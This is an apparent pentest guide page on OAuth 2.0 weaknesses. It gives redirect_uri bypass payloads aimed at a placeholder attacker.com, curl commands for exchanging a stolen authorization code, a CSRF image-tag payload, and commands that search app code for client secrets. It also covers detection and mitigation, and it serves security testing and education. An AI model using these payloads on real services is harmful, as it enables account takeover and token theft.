% Filename: 04-web-testing/auth-session/oauth.md
% Display name: OAuth Vulnerabilities
% Last update: 2026-02-11
% ATT&CK Tactics: TA0001 (Initial Access), TA0006 (Credential Access)
% ATT&CK Techniques: T1190 (Exploit Public-Facing Application), T1528 (Steal Application Access Token)
% Authors: @TristanInSec

# OAuth Vulnerabilities

## Overview

OAuth 2.0 is an authorization framework that allows third-party applications to access user resources without exposing credentials. It uses grant types (authorization code, implicit, client credentials, etc.) to issue access tokens. OAuth is complex — the interaction between client, authorization server, and resource server creates many opportunities for security flaws.

Common OAuth vulnerabilities include redirect URI manipulation, authorization code theft, CSRF attacks on the authorization flow, and token leakage through referrer headers or browser history. The implicit grant (returning tokens in URL fragments) is particularly dangerous and deprecated in OAuth 2.1.

## ATT&CK Mapping

- **Tactic:** TA0001 - Initial Access
- **Technique:** T1190 - Exploit Public-Facing Application
- **Tactic:** TA0006 - Credential Access
- **Technique:** T1528 - Steal Application Access Token

## Prerequisites

- Target application uses OAuth 2.0 for authentication or authorization
- OAuth authorization endpoint identified (typically `/oauth/authorize` or `/authorize`)
- A registered OAuth client (or ability to register one)
- Understanding of the OAuth flow in use (authorization code, implicit, etc.)

## Detection Methodology

### Identifying OAuth Endpoints

```text
/oauth/authorize
/oauth/token
/authorize
/token
/api/oauth/authorize
/.well-known/openid-configuration    (OpenID Connect discovery)
/.well-known/oauth-authorization-server
/oauth/callback
/auth/callback
/login/oauth/callback
```

```bash
# curl
# https://curl.se/
# OpenID Connect discovery (reveals all endpoints)
curl -s http://target.com/.well-known/openid-configuration | python3 -m json.tool
```

### Mapping the OAuth Flow

Intercept the full authorization flow in Burp Suite:

1. User clicks "Login with Google/GitHub/etc."
2. Browser redirects to the authorization server with parameters:
   - `client_id` — identifies the application
   - `redirect_uri` — where to send the authorization code/token
   - `response_type` — `code` (auth code flow) or `token` (implicit flow)
   - `scope` — permissions requested
   - `state` — CSRF protection token
3. User authenticates and consents
4. Authorization server redirects back with code/token

## Techniques

### Redirect URI Manipulation

The `redirect_uri` determines where the authorization server sends the code or token. If validation is weak, the attacker can redirect codes/tokens to their own server.

**Testing redirect_uri validation:**

```bash
# Exact match bypass attempts
redirect_uri=https://attacker.com
redirect_uri=https://target.com.attacker.com
redirect_uri=https://attacker.com/target.com
redirect_uri=https://target.com@attacker.com
redirect_uri=https://target.com%40attacker.com

# Subdomain/path bypass
redirect_uri=https://sub.target.com/callback
redirect_uri=https://target.com/callback/../attacker-page
redirect_uri=https://target.com/callback/..%2fattacker-page

# Open redirect chaining
redirect_uri=https://target.com/redirect?url=https://attacker.com

# Parameter pollution
redirect_uri=https://target.com/callback&redirect_uri=https://attacker.com

# Localhost/private ranges (sometimes whitelisted for development)
redirect_uri=http://localhost/callback
redirect_uri=http://127.0.0.1/callback
```

```bash
# curl
# https://curl.se/
# Test redirect_uri validation (watch for 302 redirect)
curl -s -o /dev/null -w "%{http_code} %{redirect_url}" \
  "http://target.com/oauth/authorize?client_id=CLIENT_ID&redirect_uri=https://attacker.com&response_type=code&scope=openid"
```

### Authorization Code Theft

If redirect_uri can be manipulated, the authorization code is sent to the attacker:

```bash
# Victim clicks attacker's crafted link:
https://auth-server.com/authorize?
  client_id=legitimate_app&
  redirect_uri=https://attacker.com/steal&
  response_type=code&
  scope=openid+profile+email

# Attacker receives: https://attacker.com/steal?code=AUTHORIZATION_CODE
# Attacker exchanges the code for an access token
```

```bash
# curl
# https://curl.se/
# Exchange stolen authorization code for access token
curl -s -X POST http://target.com/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=STOLEN_CODE" \
  -d "redirect_uri=https://attacker.com/steal" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET"
```

The code exchange requires `client_secret` — but some applications embed it in client-side code, or the authorization server doesn't enforce it.

### CSRF on OAuth Flow

If the `state` parameter is not used or not validated, an attacker can force a victim to complete an OAuth flow that links the attacker's account:

```html
<!-- Attacker initiates OAuth, gets a valid authorization URL, then stops -->
<!-- The URL contains the attacker's authorization code -->
<!-- Victim loads this URL — their session gets linked to attacker's account -->
<img src="https://target.com/oauth/callback?code=ATTACKER_AUTH_CODE" />
```

**Testing state parameter:**

```bash
# curl
# https://curl.se/
# Check if state parameter is required
curl -s -o /dev/null -w "%{http_code}" \
  "http://target.com/oauth/authorize?client_id=CLIENT_ID&redirect_uri=https://target.com/callback&response_type=code&scope=openid"
# If the flow proceeds without state, CSRF is possible

# Check if state is validated on callback
curl -s -o /dev/null -w "%{http_code}" \
  "http://target.com/oauth/callback?code=VALID_CODE&state=RANDOM_INVALID_VALUE"
```

### Scope Abuse

Request more permissions than the application normally needs:

```bash
# curl
# https://curl.se/
# Normal scope
curl -s "http://auth-server.com/authorize?client_id=CLIENT_ID&redirect_uri=https://target.com/callback&response_type=code&scope=openid+profile"

# Expanded scope
curl -s "http://auth-server.com/authorize?client_id=CLIENT_ID&redirect_uri=https://target.com/callback&response_type=code&scope=openid+profile+email+admin+write"
```

If the authorization server grants scopes without verifying the client is allowed to request them, the attacker gets elevated access.

### Token Leakage

**Implicit flow — token in URL fragment:**

The implicit flow returns tokens in the URL fragment (`#access_token=...`). This leaks through:

- Browser history
- JavaScript on the callback page (any script can read `window.location.hash`)
- Server access logs (if the application copies the token from the fragment into a URL parameter or API call)

**Token in server logs:**

```bash
# curl
# https://curl.se/
# If the token is in the URL query (not fragment), it appears in server logs
# Check if the application uses query parameter instead of fragment:
# https://target.com/callback?access_token=SECRET_TOKEN (leaks to server)
# vs
# https://target.com/callback#access_token=SECRET_TOKEN (stays client-side)
```

### Client Secret Exposure

```bash
# curl
# https://curl.se/
# Search JavaScript bundles for client_secret
curl -s http://target.com/static/js/app.js | grep -i "client_secret\|clientSecret"

# Check mobile app decompiled source for embedded secrets
# Android: apktool d app.apk && grep -r "client_secret" app/
# iOS: strings app.ipa | grep -i client_secret
```

If `client_secret` is exposed, the attacker can exchange authorization codes and refresh tokens on behalf of the application.

## Detection Methods

### Network-Based Detection

- OAuth authorization requests with unusual `redirect_uri` values (external domains, IP addresses)
- Missing or invalid `state` parameter in OAuth flows
- Authorization code exchange requests from unexpected IP addresses
- OAuth flows requesting elevated scopes not normal for the application
- Access token appearing in Referer headers to external domains

### Host-Based Detection

- Multiple authorization code exchange attempts for the same code (replay attempts — codes should be single-use)
- OAuth callback requests without a preceding authorization request from the same session
- Token refresh requests from new IP addresses or user agents
- Scope elevation in token exchange versus the original authorization request

## Mitigation Strategies

- **Use authorization code flow with PKCE** — PKCE (Proof Key for Code Exchange) prevents authorization code interception. Required in OAuth 2.1 for all clients
- **Strict redirect_uri validation** — exact string match only. Do not allow subdomain wildcards, path traversal, or open redirects
- **Enforce state parameter** — generate a cryptographic random state value, bind it to the user's session, and verify it on callback
- **Short-lived authorization codes** — codes should expire within 30-60 seconds and be single-use. Revoke all tokens if a code is reused
- **Avoid implicit grant** — use authorization code + PKCE instead. The implicit grant is deprecated in OAuth 2.1
- **Protect client secrets** — never embed in client-side code. Use PKCE for public clients (SPAs, mobile apps) that cannot protect secrets

## References

### Pentest Guides & Research

- [PortSwigger Web Security Academy - OAuth Authentication](https://portswigger.net/web-security/oauth)
- [OWASP - Testing for OAuth Weaknesses](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses)

### MITRE ATT&CK

- [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [T1528 - Steal Application Access Token](https://attack.mitre.org/techniques/T1528/)
